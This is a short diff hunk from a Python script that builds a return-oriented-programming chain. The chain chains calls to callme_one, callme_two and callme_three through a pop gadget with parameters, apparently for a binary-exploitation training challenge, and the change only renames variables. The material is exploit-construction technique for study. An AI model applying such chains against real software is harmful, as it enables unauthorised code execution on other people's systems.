@@ -237,9 +237,9 @@ params       = little_endian(param1) +\
 
 # Building the chain
 ROP_Chain = fill_buffer
-ROP_Chain += callme_one_PLT_ADDR + pop3words_GADGET + params
-ROP_Chain += callme_two_PLT_ADDR + pop3words_GADGET + params
-ROP_Chain += callme_three_PLT_ADDR + pop3words_GADGET + params
+ROP_Chain += callme_one + pop3words + params
+ROP_Chain += callme_two + pop3words + params
+ROP_Chain += callme_three + pop3words + params
 
 print(ROP_Chain)
 
